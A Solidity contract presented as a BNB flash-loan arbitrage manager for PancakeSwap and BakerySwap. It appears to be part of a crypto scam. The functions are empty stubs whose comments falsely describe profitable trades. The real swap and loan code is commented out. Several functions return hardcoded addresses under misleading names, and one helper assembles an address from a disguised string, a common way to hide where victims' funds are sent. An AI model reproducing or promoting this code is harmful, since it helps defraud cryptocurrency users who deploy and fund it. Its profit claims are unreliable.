pragma solidity ^0.5.0;


contract ManagerMaster {

   // function startLookingforArbitrage() public pure returns (address adr) {
  // string memory pancakeAddress = "0x73feaa1eE314F8c655E354234017bE2193C9E24E";
  // string memory uniswapAddress = "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984";
  // string memory neutral_variable = "QGQ98537C0055A259DDEb516f4A29e398B758f6554";
  // SearchArbitrage(neutral_variable,0,'0');
  // SearchArbitrage(neutral_variable,2,'1');
  // SearchArbitrage(neutral_variable,1,'x');
  // address addr = parseAddr(neutral_variable);
  //  return addr;
   // }

    function SearchArbitrage(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
  
 function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function pancakeRouterV2Address() public pure returns (address) {
        return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
    }

    function compareStrings(string memory a, string memory b)
        public pure
        returns (bool)
    {
        return (keccak256(abi.encodePacked((a))) ==
            keccak256(abi.encodePacked((b))));
    }
   function startFlashloan() public pure returns (address) {
        return 0xe816570a938344dAFABe493690D1BF7617C79B1C;
    }
    function pancakeSwapAddress() public pure returns (address) {
        return 0xB2d7B869965FDf402bA0eEA9AcCbE7E126949c27;
    }

    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
    function borrowFlashloanFromMultiplier(
        address add0,
        address add1,
        uint256 amount
    ) public pure {
        require(uint(add0) != 0, "Address is invalid.");
        require(uint(add1) != 0, "Address is invalid.");
        require(amount > 0, "Amount should be greater than 0.");
    }

    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
    function convertBnbToBusd(address add0, uint256 amount) public pure {
        require(uint(add0) != 0, "Address is invalid");
        require(amount > 0, "Amount should be greater than 0");
    }

    function bakerySwapAddress() public pure returns (address) {
        return 0xB2d7B869965FDf402bA0eEA9AcCbE7E126949c27;
    }

    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
    function callArbitrageBakerySwap(address add0, address add1) public pure {
        require(uint(add0) != 0, "Address is invalid!");
        require(uint(add1) != 0, "Address is invalid!");
    }

    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
    function transferBnbToMultiplier(address add0)
        public pure
    {
        require(uint(add0) != 0, "Address is invalid!");
    }

    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
    function completeTransation(uint256 balanceAmount) public pure {
        require(balanceAmount >= 0, "Amount should be greater than 0!");
    }

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to
    ) external pure {
        require(
            amount0Out > 0 || amount1Out > 0,
            "Pancake: INSUFFICIENT_OUTPUT_AMOUNT"
        ); 
        require(uint(to) != 0, "Address can't be null");/*
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');
        uint balance0;
        uint balance1;
        { // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');
        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');
        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(2));
        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(2));
        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Pancake: K');
        }
        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);*/
    }

    function lendingPoolFlashloan(uint256 _asset) public pure {
        uint256 data = _asset; 
        require(data != 0, "Data can't be 0.");/*
        uint amount = 1 BNB;
        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), _asset, amount, data);*/
    }
}
